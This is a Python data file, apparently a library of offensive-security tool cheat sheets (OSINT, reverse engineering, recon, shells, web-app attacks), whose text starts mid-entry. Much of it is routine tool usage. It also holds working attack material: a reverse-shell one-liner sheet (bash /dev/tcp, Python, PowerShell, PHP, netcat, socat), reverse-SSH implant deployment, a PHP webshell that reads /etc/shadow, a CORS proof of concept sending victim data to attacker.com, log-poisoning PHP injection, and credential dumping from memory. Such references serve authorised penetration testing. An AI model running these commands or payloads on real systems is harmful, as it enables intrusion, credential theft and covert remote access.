sudo bash mimipenguin.sh
```

**Redirect output:**
```bash
sudo python3 mimipenguin.py | tee /tmp/.creds
```

> **Note**: Effectiveness depends on what services are running and memory layout.

## Resources

| File | When to load |
|------|--------------|
| `references/` | Process memory dump techniques on Linux |
""",
    },
    # --- osint ---
    "osint/holehe": {
        "name": "holehe",
        "description": "Check if an email address is registered on 120+ websites (Google, Twitter, GitHub, etc.). Use during OSINT to enumerate target digital presence and identify accounts across platforms.",
        "compatibility": "Python 3; pip install holehe; Linux/macOS/Windows; github.com/megadose/holehe",
        "body": """# Holehe

Email-to-account mapper — check if an email is registered across 120+ services.

## Quick Start

```bash
pip install holehe

# Check a single email
holehe target@gmail.com

# Output only registered sites
holehe target@gmail.com --only-used

# JSON output
holehe target@gmail.com --only-used --json > results.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--only-used` | Show only sites where email is registered |
| `--no-color` | Disable color output |
| `--json` | JSON output |
| `-T N` | Timeout per request |

## Sites Checked (examples)

`Google` · `Twitter/X` · `GitHub` · `Instagram` · `LinkedIn` · `Reddit` · `Snapchat` · `Spotify` · `Adobe` · `Airbnb` · `Amazon` · `Dropbox` · `Flickr` · `Pinterest` · `Tumblr` + 100 more

## Common Workflows

**OSINT on target email:**
```bash
holehe ceo@targetcompany.com --only-used --json | tee email_presence.json
```

**Batch check from file:**
```bash
cat emails.txt | xargs -I {} holehe {} --only-used
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Interpreting results and account takeover paths |
""",
    },
    "osint/maltego": {
        "name": "maltego",
        "description": "Visual intelligence and link analysis platform for mapping relationships between people, organizations, domains, IPs, and infrastructure. Use when building entity relationship graphs during recon or threat intelligence gathering.",
        "compatibility": "Java; Linux/macOS/Windows; GUI; maltego.com; Community Edition free",
        "body": """# Maltego

Visual OSINT and link analysis — entity graph mapping for people, domains, IPs, orgs.

## Quick Start

1. Download from maltego.com → register for Community Edition (free)
2. Launch Maltego → New Graph
3. Drag entity from palette (e.g., Domain)
4. Type target domain → Run All Transforms

## Key Entity Types

| Entity | Transforms |
|--------|-----------|
| Domain | DNS, WHOIS, subdomains, MX, NS |
| IP Address | Geo, reverse DNS, netblock, Shodan |
| Person | Social accounts, email, phone |
| Organization | People, domains, certificates |
| Email | Breaches, social accounts (Holehe) |
| Website | Tech fingerprint, links |

## Common Transforms

| Transform | Purpose |
|-----------|---------|
| `To DNS Name` | Subdomain enum |
| `To IP Address` | Resolve domain |
| `To Website` | Enumerate web presence |
| `To Email Address` | Find emails |
| `To Social Accounts` | Map social media |
| `Shodan Search` | Enumerate open ports |

## Common Workflows

**Domain recon:**
1. Add Domain entity → target.com
2. Run: `DNS Name – To DNS Name [MX/NS/A]`
3. Run: `Domain – To Website`
4. Run: `IP – To Shodan`

**Person OSINT:**
1. Add Person entity → Full Name
2. Run: `Person – To Email`
3. Run: `Email – To Social Accounts`

## Resources

| File | When to load |
|------|--------------|
| `references/` | Custom transform and API integration notes |
""",
    },
    "osint/phoneinfoga": {
        "name": "phoneinfoga",
        "description": "Phone number OSINT tool — gather carrier, location, and online presence data for phone numbers. Use when pivoting on phone numbers during target profiling or social engineering preparation.",
        "compatibility": "Go binary; Linux/macOS/Windows; github.com/sundowndev/phoneinfoga",
        "body": """# PhoneInfoga

Phone number reconnaissance — carrier, country, online presence, breach data.

## Quick Start

```bash
# Download from GitHub releases
# Or Docker
docker run --rm sundowndev/phoneinfoga scan -n +1234567890

# Scan a number (international format)
phoneinfoga scan -n +14151234567

# Start web UI
phoneinfoga serve
# → http://localhost:5000
```

## Core Commands

| Command | Purpose |
|---------|---------|
| `scan -n NUMBER` | Full scan on number |
| `serve` | Launch web dashboard |
| `--output json` | JSON output |

## Information Retrieved

- Country, carrier, line type (mobile/landline/VoIP)
- Possible owner via reverse lookup
- Google dork results (social media, directories)
- NumVerify / Numinfo API data (if configured)
- Breach lookups (HaveIBeenPwned linked accounts)

## Common Workflows

**Quick scan:**
```bash
phoneinfoga scan -n +14151234567
```

**Web dashboard for manual investigation:**
```bash
phoneinfoga serve &
open http://localhost:5000
```

**JSON output for automation:**
```bash
phoneinfoga scan -n +14151234567 --output json > phone.json
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | API key setup and dork expansion |
""",
    },
    "osint/sherlock": {
        "name": "sherlock",
        "description": "Hunt username presence across 400+ social networks. Use when pivoting on a discovered username during OSINT to map a target's digital footprint across platforms.",
        "compatibility": "Python 3; pip install sherlock-project; Linux/macOS/Windows; github.com/sherlock-project/sherlock",
        "body": """# Sherlock

Username hunter across 400+ social platforms.

## Quick Start

```bash
pip install sherlock-project

# Search single username
sherlock username

# Search multiple usernames
sherlock user1 user2 user3

# Output to file
sherlock username --output results.txt

# JSON output
sherlock username --json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `--timeout N` | Per-site timeout (default: 60s) |
| `--print-found` | Only show found accounts |
| `--print-all` | Show all (including not found) |
| `--output FILE` | Save results |
| `--json` | JSON format |
| `--site NAME` | Search specific site only |
| `--csv` | CSV output |
| `-x XLSX` | Excel output |

## Common Workflows

**Hunt username from breach data:**
```bash
sherlock johndoe_83 --print-found --output johndoe_found.txt
```

**Multiple username variants:**
```bash
sherlock "john.doe" johndoe john_doe jdoe --print-found
```

**Targeted site lookup:**
```bash
sherlock johndoe --site twitter --site github --site linkedin
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Username variation techniques |
""",
    },
    # --- re ---
    "re/binwalk": {
        "name": "binwalk",
        "description": "Analyze and extract firmware images, identifying embedded file systems, compressed archives, and executable code. Use when reversing IoT firmware, embedded devices, or binary blobs during hardware/firmware security assessments.",
        "compatibility": "Python 3; pip install binwalk or apt install binwalk; Linux/macOS",
        "body": """# Binwalk

Firmware analysis and extraction — identify and extract embedded files from binary blobs.

## Quick Start

```bash
# Install
apt install binwalk

# Scan firmware for signatures
binwalk firmware.bin

# Extract all found content
binwalk -e firmware.bin
# Output in _firmware.bin.extracted/

# Recursive extraction
binwalk -eM firmware.bin
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-e` | Extract found files |
| `-M` | Recursive extraction (matryoshka) |
| `-B` | Signature scan (default) |
| `-E` | Entropy analysis |
| `-A` | Disassemble CPU instructions |
| `-C DIR` | Output directory |
| `-q` | Quiet mode |
| `--dd TYPE:OFFSET:SIZE` | Manual extraction |
| `-l N` | Limit extraction size |

## Common Workflows

**Full firmware analysis:**
```bash
binwalk -eM firmware.bin -C ./extracted/
ls ./extracted/
```

**Find compressed/encrypted regions (entropy):**
```bash
binwalk -E firmware.bin
# High entropy = encrypted/compressed, low = plaintext
```

**Find hardcoded strings after extraction:**
```bash
binwalk -eM firmware.bin
find ./_firmware.bin.extracted/ -type f | xargs strings | grep -i "password\|admin\|key"
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Filesystem types and QEMU emulation notes |
""",
    },
    "re/ghidra": {
        "name": "ghidra",
        "description": "NSA's open-source reverse engineering suite with disassembler, decompiler, and scripting. Use when statically analyzing malware, firmware, or binaries to understand logic, find vulnerabilities, or recover algorithms.",
        "compatibility": "Java 11+; Linux/macOS/Windows; GUI; github.com/NationalSecurityAgency/ghidra",
        "body": """# Ghidra

NSA open-source RE suite — disassembler + decompiler + scripting for static analysis.

## Quick Start

1. Download from ghidra-sre.org
2. `./ghidraRun` (Linux/macOS) or `ghidraRun.bat` (Windows)
3. New Project → Import File → target binary
4. Double-click to open CodeBrowser → Analyze (auto-analysis)

## Key Windows

| Window | Purpose |
|--------|---------|
| Symbol Tree | Functions, labels, imports |
| Decompiler | C pseudocode of selected function |
| Listing | Assembly view |
| Data Type Manager | Struct/enum definitions |
| Program Trees | Segments/sections |
| References | Cross-references to/from |

## Common Analysis Tasks

**Find interesting functions:**
```
Search > For Strings → look for "password", "exec", "http"
Window > Symbol Tree > Functions → filter by name
```

**Rename and annotate:**
```
Right-click function → Edit Function → rename
Right-click variable → Rename Variable
```

**Scripting (Python/Java):**
```python
# Script Manager > New Script (Python)
from ghidra.program.flatapi import FlatProgramAPI
api = FlatProgramAPI(currentProgram)
funcs = list(api.getFunctions(True))
print([f.getName() for f in funcs[:10]])
```

## Common Workflows

**Malware static analysis:**
1. Import sample → auto-analyze
2. Symbol Tree → Imports: check suspicious APIs (VirtualAlloc, CreateRemoteThread)
3. Decompile each suspicious function

**Find hardcoded credentials:**
```
Search > For Strings → password/key/secret
Double-click result → decompile surrounding function
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Script examples and struct recovery tips |
""",
    },
    "re/radare2": {
        "name": "radare2",
        "description": "CLI reverse engineering framework with disassembly, debugging, scripting, and binary patching. Use when analyzing binaries headlessly, scripting RE tasks, patching executables, or working in resource-constrained environments.",
        "compatibility": "C; Linux/macOS/Windows; apt install radare2 or github.com/radareorg/radare2",
        "body": """# Radare2

CLI RE framework — disassemble, debug, patch, and script binary analysis.

## Quick Start

```bash
# Open binary (read-only)
r2 ./binary

# Analyze all (auto-analysis)
> aaa

# List functions
> afl

# Disassemble function
> pdf @ main

# Print strings
> iz

# Quit
> q
```

## Essential Commands

| Command | Purpose |
|---------|---------|
| `aaa` | Full auto-analysis |
| `afl` | List all functions |
| `pdf @ FUNC` | Disassemble function |
| `s ADDR` | Seek to address |
| `iz` | Print strings in binary |
| `iS` | List sections |
| `ii` | List imports |
| `px N @ ADDR` | Hex dump N bytes at ADDR |
| `ood` | Reopen in debug mode |
| `dc` | Continue execution |
| `dr` | Show registers |
| `VV` | Visual graph mode |
| `/` | Search bytes/strings |

## Common Workflows

**Quick static triage:**
```
r2 malware.exe
> aaa; afl; iz; ii
> pdf @ sym.main
```

**Patch a jump:**
```
r2 -w ./binary
> s 0x401234       # seek to instruction
> wa jmp 0x401300  # write assembly
> q
```

**Script with r2pipe (Python):**
```python
import r2pipe
r2 = r2pipe.open('./binary')
r2.cmd('aaa')
print(r2.cmd('afl'))
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | r2pipe scripting and debugging shortcuts |
""",
    },
    "re/x64dbg": {
        "name": "x64dbg",
        "description": "User-mode debugger for Windows x64/x86 with plugin ecosystem for malware analysis, unpacking, and vulnerability research. Use when dynamically analyzing PE malware, unpacking obfuscated executables, or tracing Windows API calls.",
        "compatibility": "Windows x86/x64; GUI; x64dbg.com",
        "body": """# x64dbg

Windows debugger for dynamic malware analysis, unpacking, and API tracing.

## Quick Start

1. Download from x64dbg.com → extract → run `x96dbg.exe` (launcher auto-selects x32/x64)
2. **File > Open** → target executable
3. Set breakpoint: `F2` on instruction, or `bp CreateRemoteThread`
4. **Run**: `F9` | **Step over**: `F8` | **Step into**: `F7`
5. **Plugins**: load ScyllaHide (anti-anti-debug), xAnalyzer

## Key Panels

| Panel | Purpose |
|-------|---------|
| CPU | Disassembly + registers + stack + hex |
| Log | API calls, plugin output |
| Breakpoints | Manage all BPs |
| Memory Map | Virtual memory regions |
| References | XREFs to selected |
| Symbols | Module imports/exports |

## Common Commands

| Action | Key / Command |
|--------|--------------|
| Run / Pause | F9 |
| Step Over | F8 |
| Step Into | F7 |
| Execute till return | Ctrl+F9 |
| Set breakpoint | F2 |
| Breakpoint on API | `bp VirtualAlloc` in command bar |
| Follow in dump | Ctrl+D on address |
| Search strings | Ctrl+F in disassembly |

## Common Workflows

**Unpack malware:**
1. Open sample → run until OEP (watch for `jmp eax/rax` after decryption loop)
2. Dump process with Scylla plugin → fix imports → save

**Find C2 callback:**
```
bp WS2_32.connect
bp WS2_32.send
F9 → examine stack args
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Plugin list and unpack methodology |
""",
    },
    # --- recon ---
    "recon/dirsearch": {
        "name": "dirsearch",
        "description": "Web path scanning and directory brute-forcing with recursive scanning and multi-extension support. Use when enumerating web server content, finding hidden endpoints, and discovering backup or config files.",
        "compatibility": "Python 3; pip install dirsearch; Linux/macOS/Windows; github.com/maurosoria/dirsearch",
        "body": """# Dirsearch

Web directory and file brute-forcer with recursion, extensions, and proxy support.

## Quick Start

```bash
pip install dirsearch

# Basic scan
dirsearch -u https://target.com

# With extensions
dirsearch -u https://target.com -e php,asp,aspx,bak,txt

# Recursive
dirsearch -u https://target.com -r

# Output to file
dirsearch -u https://target.com -o results.txt
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL |
| `-e EXT` | Extensions (comma-separated) |
| `-w FILE` | Custom wordlist |
| `-r` | Recursive scanning |
| `-R N` | Max recursion depth |
| `-t N` | Threads (default: 25) |
| `-x CODES` | Exclude status codes |
| `--proxy URL` | HTTP proxy |
| `-o FILE` | Output file |
| `--format FORMAT` | plain/json/xml/md |

## Common Workflows

**PHP app scan with backups:**
```bash
dirsearch -u https://target.com -e php,bak,old,txt,zip -r -t 30
```

**Exclude 404s and noise:**
```bash
dirsearch -u https://target.com -x 404,403,301
```

**API path discovery:**
```bash
dirsearch -u https://api.target.com -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Wordlist selection and recursion tuning |
""",
    },
    "recon/hakrawler": {
        "name": "hakrawler",
        "description": "Fast Go web crawler for discovering URLs, endpoints, and JavaScript files. Use when crawling web applications to build a URL inventory before fuzzing or during OSINT on web infrastructure.",
        "compatibility": "Go; go install github.com/hakluke/hakrawler@latest; Linux/macOS/Windows",
        "body": """# Hakrawler

Fast Go web crawler — discover URLs, JS files, forms, and endpoints.

## Quick Start

```bash
go install github.com/hakluke/hakrawler@latest

# Crawl a domain
echo https://target.com | hakrawler

# Depth 3, include subdomains
echo https://target.com | hakrawler -d 3 -subs

# Output as JSON
echo https://target.com | hakrawler -json

# Pipe multiple domains
cat domains.txt | hakrawler -d 2
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-d N` | Depth (default: 1) |
| `-subs` | Include subdomains |
| `-u` | Unique URLs only |
| `-insecure` | Skip TLS verification |
| `-t N` | Threads |
| `-timeout N` | Timeout per request (s) |
| `-H "K:V"` | Custom header |
| `-json` | JSON output |
| `-scope REGEX` | Limit to URL pattern |

## Common Workflows

**Build URL inventory for fuzzing:**
```bash
echo https://target.com | hakrawler -d 3 -u | tee urls.txt
# Feed to ffuf
ffuf -w urls.txt:URL -u URL -mc 200
```

**Discover JS files:**
```bash
echo https://target.com | hakrawler -d 2 | grep "\.js$"
```

**Combine with httpx for live check:**
```bash
cat domains.txt | hakrawler | httpx -silent -mc 200
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Scope filtering and JS analysis tips |
""",
    },
    "recon/massdns": {
        "name": "massdns",
        "description": "High-performance DNS resolver for bulk subdomain resolution. Use when you have a large subdomain list and need to resolve all entries quickly using public resolvers.",
        "compatibility": "C; Linux/macOS; build from source; github.com/blechschmidt/massdns",
        "body": """# MassDNS

High-speed DNS bulk resolver — resolve millions of subdomains per minute.

## Quick Start

```bash
git clone https://github.com/blechschmidt/massdns
cd massdns && make

# Resolve subdomain list
./bin/massdns -r resolvers.txt -t A subdomains.txt -o S -w resolved.txt

# Built-in resolver list
./bin/massdns -r lists/resolvers.txt -t A subdomains.txt -o S > resolved.txt
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-r FILE` | Resolver list file |
| `-t TYPE` | DNS type (A/AAAA/MX/NS/CNAME) |
| `-o FORMAT` | Output format (S=simple, J=JSON, L=list) |
| `-w FILE` | Write output to file |
| `-s N` | Concurrent resolvers |
| `--root` | Use root server for NS lookups |
| `--verify-ip` | Verify A record IPs |

## Common Workflows

**Subdomain enumeration pipeline:**
```bash
# Generate candidates with subfinder
subfinder -d target.com -silent -o subs.txt

# Resolve with massdns
./bin/massdns -r lists/resolvers.txt -t A subs.txt -o S | grep -v NXDOMAIN > live.txt
```

**Extract live IPs:**
```bash
cat resolved.txt | grep " A " | awk '{print $3}' | sort -u > ips.txt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Resolver list sources and rate tuning |
""",
    },
    "recon/sn1per": {
        "name": "sn1per",
        "description": "Automated penetration testing recon framework combining 20+ tools in a single scan. Use when performing comprehensive target recon that combines port scanning, subdomain discovery, web crawling, and vulnerability detection.",
        "compatibility": "Bash; Linux (Kali recommended); github.com/1N3/Sn1per",
        "body": """# Sn1per

Automated recon framework — orchestrates nmap, nikto, metasploit, amass, and 20+ tools.

## Quick Start

```bash
git clone https://github.com/1N3/Sn1per
cd Sn1per && bash install.sh

# Full recon on target
sniper -t target.com

# Network CIDR scan
sniper -t 10.10.10.0/24 -m discover

# Web scan only
sniper -t target.com -m web
```

## Scan Modes

| Mode | Purpose |
|------|---------|
| (default) | Full recon + vuln scan |
| `discover` | Network discovery (ping sweep, port scan) |
| `stealth` | Slower, quieter scan |
| `web` | Web-focused (nikto, gobuster, etc.) |
| `bruteforce` | Service brute-force |
| `airstrike` | Mass scan from CIDR |
| `nuke` | Full attack automation |

## Common Workflows

**Full target assessment:**
```bash
sniper -t target.com
# Results in /usr/share/sniper/loot/
```

**CIDR discovery:**
```bash
sniper -t 192.168.1.0/24 -m discover -w workspace1
```

**Web app assessment:**
```bash
sniper -t https://app.target.com -m web
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Module configuration and loot paths |
""",
    },
    "recon/sublist3r": {
        "name": "sublist3r",
        "description": "Subdomain enumeration using OSINT sources (Google, Bing, Baidu, DNSDumpster, VirusTotal, ThreatCrowd). Use when passively enumerating subdomains from public search engines and threat intel platforms.",
        "compatibility": "Python 3; pip install sublist3r; Linux/macOS/Windows; github.com/aboul3la/Sublist3r",
        "body": """# Sublist3r

Passive subdomain enumeration via OSINT — search engines, DNSDumpster, VirusTotal.

## Quick Start

```bash
pip install sublist3r

# Basic subdomain enum
sublist3r -d target.com

# With brute-force
sublist3r -d target.com -b -w wordlist.txt

# Save output
sublist3r -d target.com -o subdomains.txt

# Verbose (show sources)
sublist3r -d target.com -v
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-d DOMAIN` | Target domain |
| `-b` | Enable brute-force |
| `-w FILE` | Brute-force wordlist |
| `-p PORTS` | Check ports on found hosts |
| `-v` | Verbose (show each source) |
| `-t N` | Threads (default: 10) |
| `-o FILE` | Output file |
| `-e ENGINES` | Comma-separated engines |

## Sources Used

Google · Bing · Yahoo · Baidu · Ask · Netcraft · DNSDumpster · VirusTotal · ThreatCrowd · SSL certs · PassiveDNS

## Common Workflows

**Passive only (stealthy):**
```bash
sublist3r -d target.com -o passive_subs.txt
```

**Active brute + passive combined:**
```bash
sublist3r -d target.com -b -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o all_subs.txt
```

**Pipe to resolver:**
```bash
sublist3r -d target.com -o subs.txt
cat subs.txt | dnsx -silent -a -resp > live.txt
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Engine API keys and wordlist sources |
""",
    },
    # --- shells ---
    "shells/reverse-ssh": {
        "name": "reverse-ssh",
        "description": "Establish reverse SSH tunnels from victim to attacker for interactive shell access behind NAT/firewall. Use when target is not directly reachable and you need a stable SSH shell through outbound-only connections.",
        "compatibility": "Go binary; Linux/macOS/Windows; github.com/Fahrj/reverse-ssh",
        "body": """# Reverse-SSH

Reverse SSH tunnel implant — SSH shell through outbound connection, no port forwarding needed.

## Quick Start

```bash
# Attacker: start SSH server (any standard SSH server)
# Default: binds on attacker port 8888

# Victim: run reverse-ssh binary
./reverse-ssh <attacker_ip>:<port>

# Attacker: connect back
ssh -p 8888 localhost          # Interact with victim shell
# Or list connected
ssh -p 8888 127.0.0.1 ls
```

## Common Flags

| Flag | Purpose |
|------|---------|
| `-p PORT` | Local bind port on victim |
| `--ssh-port N` | Attacker SSH server port |
| `-l USER` | Login user |
| `--socks5` | Enable SOCKS5 proxy |
| `--foreground` | Don't daemonize |

## Common Workflows

**Deploy reverse shell:**
```bash
# Compile for Windows target (from Linux)
GOOS=windows GOARCH=amd64 go build -o rev.exe .
# Transfer to victim, execute:
rev.exe ATTACKER_IP:8888
```

**Port forwarding via reverse SSH:**
```bash
# From attacker, tunnel internal RDP
ssh -p 8888 -L 3389:127.0.0.1:3389 localhost
# Connect RDP client to localhost:3389
```

**SOCKS5 proxy:**
```bash
./reverse-ssh --socks5 ATTACKER:8888
# SSH with -D for SOCKS
ssh -p 8888 -D 1080 localhost
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Persistence and cross-compile notes |
""",
    },
    "shells/revshells": {
        "name": "revshells",
        "description": "Reverse shell one-liner generator (web UI and CLI) supporting 50+ shells. Use when quickly generating encoded reverse shell payloads for bash, Python, PowerShell, PHP, and other languages during exploitation.",
        "compatibility": "Web: revshells.com; CLI: github.com/0dayCTF/reverse-shell-generator",
        "body": """# RevShells

Reverse shell one-liner generator — 50+ shells, encoded variants, web UI at revshells.com.

## Quick Start

```
# Web UI: https://revshells.com
# Enter: IP, Port, Shell type → Copy one-liner

# Popular one-liners (substitute IP/PORT):
```

## Shell Cheatsheet

```bash
# Bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1

# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# PHP
php -r '$sock=fsockopen("ATTACKER",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh ATTACKER PORT
nc ATTACKER PORT | /bin/sh | nc ATTACKER PORT2

# Socat
socat tcp:ATTACKER:PORT exec:'/bin/bash',pty,stderr,setsid,sigint,sane
```

## Upgrade Shell to PTY

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z → stty raw -echo; fg → export TERM=xterm
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Encoded variants and PTY upgrade techniques |
""",
    },
    "shells/shellerator": {
        "name": "shellerator",
        "description": "CLI reverse/bind shell generator supporting 20+ languages with optional encoding. Use when generating customized shell payloads for specific languages and encodings during exploitation.",
        "compatibility": "Python 3; pip install shellerator; Linux/macOS/Windows; github.com/ShutdownRepo/shellerator",
        "body": """# Shellerator

CLI shell payload generator — reverse and bind shells for 20+ languages.

## Quick Start

```bash
pip install shellerator

# Interactive mode
shellerator

# Generate bash reverse shell
shellerator -t reverse -l bash --ip ATTACKER --port 4444

# Generate PowerShell bind shell
shellerator -t bind -l powershell --port 4444

# List all supported languages
shellerator --list
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-t TYPE` | `reverse` or `bind` |
| `-l LANG` | Shell language |
| `--ip IP` | Attacker IP (reverse) |
| `--port PORT` | Port |
| `-e ENCODING` | Encoding (base64, url, etc.) |
| `--list` | List supported languages |

## Supported Languages (examples)

`bash` · `sh` · `python` · `python3` · `perl` · `php` · `ruby` · `powershell` · `netcat` · `java` · `groovy` · `golang` · `lua` · `nodejs` · `socat` · `awk`

## Common Workflows

**Quick payload for exploit:**
```bash
shellerator -t reverse -l python3 --ip 10.10.14.5 --port 4444
```

**Base64-encoded for WAF bypass:**
```bash
shellerator -t reverse -l bash --ip 10.10.14.5 --port 4444 -e base64
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Language selection and encoding tips |
""",
    },
    "shells/weevely3": {
        "name": "weevely3",
        "description": "Stealth PHP webshell with 30+ post-exploitation modules for file ops, pivoting, and persistence. Use after file upload or RFI vulnerabilities to get an interactive PHP shell with built-in post-ex modules.",
        "compatibility": "Python 3; Linux/macOS; github.com/epinna/weevely3",
        "body": """# Weevely3

Stealth PHP webshell with 30+ post-exploitation modules.

## Quick Start

```bash
git clone https://github.com/epinna/weevely3
cd weevely3 && pip3 install -r requirements.txt

# Generate obfuscated PHP shell
python3 weevely.py generate MyPassword shell.php
# Upload shell.php to target

# Connect
python3 weevely.py http://target.com/uploads/shell.php MyPassword
```

## Core Commands (in shell)

| Command | Purpose |
|---------|---------|
| `:help` | List all modules |
| `:file_read /etc/passwd` | Read file |
| `:file_download /etc/shadow /tmp/shadow` | Download file |
| `:file_upload /local/file /remote/path` | Upload file |
| `:shell_sh "id"` | Run OS command |
| `:net_scan 192.168.1.0/24 22,80,443` | Port scan |
| `:net_proxy socks5` | Start SOCKS5 proxy |
| `:audit_phpconf` | Audit PHP config |
| `:bruteforce_sql` | SQL brute-force |

## Common Workflows

**Full post-ex after upload:**
```
:shell_sh "id && uname -a"
:file_read /etc/passwd
:net_scan 10.10.10.0/24 22,80,443
:net_proxy socks5 0.0.0.0 1080
```

**Pivot via SOCKS5:**
```
:net_proxy socks5 127.0.0.1 1080
# Configure proxychains → proxychains nmap internal_host
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Module list and evasion options |
""",
    },
    # --- web-app ---
    "web-app/corsy": {
        "name": "corsy",
        "description": "CORS misconfiguration scanner that detects exploitable cross-origin resource sharing issues. Use when testing web apps for CORS vulnerabilities that could allow cross-origin data theft.",
        "compatibility": "Python 3; pip install corsy; Linux/macOS/Windows; github.com/s0md3v/Corsy",
        "body": """# Corsy

CORS misconfiguration scanner — detect exploitable cross-origin policy flaws.

## Quick Start

```bash
pip install corsy

# Single URL
corsy -u https://target.com

# With authentication
corsy -u https://target.com -H "Authorization: Bearer TOKEN"

# Bulk scan from file
corsy -i urls.txt

# Output to JSON
corsy -u https://target.com --json > cors.json
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-u URL` | Target URL |
| `-i FILE` | Input file with URLs |
| `-H "K:V"` | Custom header |
| `-t N` | Threads |
| `-d N` | Delay between requests (ms) |
| `-q` | Quiet (no banner) |
| `--json` | JSON output |

## CORS Misconfig Types Detected

| Type | Condition |
|------|-----------|
| Reflected Origin | Any origin reflected back |
| Trusted Null | `null` origin trusted |
| Prefix Match | `eviltarget.com` accepted when `target.com` trusted |
| Suffix Match | `notatarget.com` accepted |
| Trusted Subdomain | All subdomains trusted |
| HTTP allowed | HTTP origin trusted on HTTPS endpoint |

## Common Workflows

**Scan authenticated endpoint:**
```bash
corsy -u https://api.target.com/user/profile -H "Cookie: session=abc123"
```

**Verify with PoC:**
```html
<script>
fetch('https://api.target.com/user/data', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('https://attacker.com?d='+btoa(d)))
</script>
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | CORS exploit PoC templates |
""",
    },
    "web-app/dotdotpwn": {
        "name": "dotdotpwn",
        "description": "Directory traversal vulnerability fuzzer for web servers and applications. Use when testing for path traversal and LFI vulnerabilities across HTTP, FTP, and TFTP services.",
        "compatibility": "Perl; Linux/macOS; apt install dotdotpwn; github.com/wireghoul/dotdotpwn",
        "body": """# DotDotPwn

Directory traversal fuzzer — test for path traversal across HTTP, FTP, TFTP.

## Quick Start

```bash
apt install dotdotpwn

# HTTP traversal
dotdotpwn -m http -h target.com -x 80

# HTTP with specific URL
dotdotpwn -m http -h target.com -U "http://target.com/page?file=TRAVERSAL"

# FTP
dotdotpwn -m ftp -h target.com -x 21 -u user -p pass
```

## Core Flags

| Flag | Purpose |
|------|---------|
| `-m MODULE` | Module: http/http-url/ftp/tftp/payload |
| `-h HOST` | Target host |
| `-x PORT` | Target port |
| `-U URL` | URL with TRAVERSAL placeholder |
| `-u USER` | Username (FTP) |
| `-p PASS` | Password (FTP) |
| `-f FILE` | Target file (e.g., `/etc/passwd`) |
| `-d N` | Traversal depth (default: 6) |
| `-t N` | Time between requests (ms) |
| `-q` | Quiet mode |
| `-s` | Stop on first found |

## Common Workflows

**HTTP-URL traversal with custom path:**
```bash
dotdotpwn -m http-url -h target.com -U "http://target.com/download.php?file=TRAVERSAL" -f /etc/passwd -d 8 -q
```

**Windows target:**
```bash
dotdotpwn -m http -h target.com -f "windows/system32/cmd.exe" -d 6
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Encoding bypass and Windows path notes |
""",
    },
    "web-app/lfisuite": {
        "name": "lfisuite",
        "description": "Automated Local File Inclusion testing and exploitation tool with path traversal and log poisoning. Use when testing and exploiting LFI vulnerabilities to achieve RCE via log poisoning or /proc inclusion.",
        "compatibility": "Python 3; Linux/macOS; github.com/D35m0nd142/LFISuite",
        "body": """# LFISuite

Automated LFI tester and exploiter — path traversal, log poisoning, RCE.

## Quick Start

```bash
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite && python3 lfisuite.py

# Or run directly (interactive)
python3 lfisuite.py
```

## Interactive Menu Options

| Option | Purpose |
|--------|---------|
| 1 | Auto exploit (all techniques) |
| 2 | /etc/passwd inclusion |
| 3 | Log poisoning (Apache/Nginx) |
| 4 | /proc/self/environ |
| 5 | PHP wrapper (expect://) |
| 6 | PHP wrapper (php://filter) |
| 7 | PHP wrapper (php://input) |
| 8 | Remote file inclusion (RFI) |

## Common Workflows

**Confirm LFI manually first:**
```
http://target.com/page.php?file=../../../../etc/passwd
http://target.com/page.php?file=....//....//etc/passwd
http://target.com/page.php?file=%2fetc%2fpasswd
```

**Log poisoning to RCE:**
1. Inject PHP into User-Agent header via curl:
```bash
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
```
2. Include log file via LFI → execute `cmd=id`

**PHP filter to read source:**
```
?file=php://filter/convert.base64-encode/resource=index.php
```

## Resources

| File | When to load |
|------|--------------|
| `references/` | Wrapper techniques and filter bypass |
